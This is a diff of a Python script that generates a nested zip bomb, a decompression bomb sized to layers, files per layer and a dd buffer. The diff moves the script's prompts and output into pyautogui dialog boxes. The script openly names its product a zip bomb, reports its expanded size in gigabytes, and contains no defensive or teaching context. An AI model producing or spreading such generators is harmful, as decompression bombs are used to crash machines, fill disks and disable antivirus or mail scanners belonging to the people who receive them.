@@ -1,11 +1,15 @@
-import os
-import subprocess
+import os, subprocess, pyautogui
 
-layers = int(input("Amount of layers: "))
-files = int(input("Amount of files per layer: "))
+os.system('cls') if os.name == 'nt' else os.system('clear')
+
+layers = int(pyautogui.prompt('Amount of layers:'))
+#layers = int(input("Amount of layers: "))
+files = int(pyautogui.prompt('Amount of files per layer:'))
+#files = int(input("Amount of files per layer: "))
 try: buff = int(input("dd buffer size (default=10 gb): "))
 except ValueError: buff = 10
-print(f"total zip bomb size: {buff*(files**layers)} gigabytes")
+pyautogui.alert(f'total zip bomb size: {buff*(files**layers)} gb')
+#print(f"total zip bomb size: {buff*(files**layers)} gigabytes")
 
 cwd = os.getcwd()
 try: os.mkdir("out")
@@ -22,3 +26,5 @@ for i in range(layers):
 os.system(f"cp zip0.zip {cwd}/zipbomb.zip")
 os.chdir(cwd)
 os.system("rm -rf out")
+
+pyautogui.alert('Process ended with status 0')
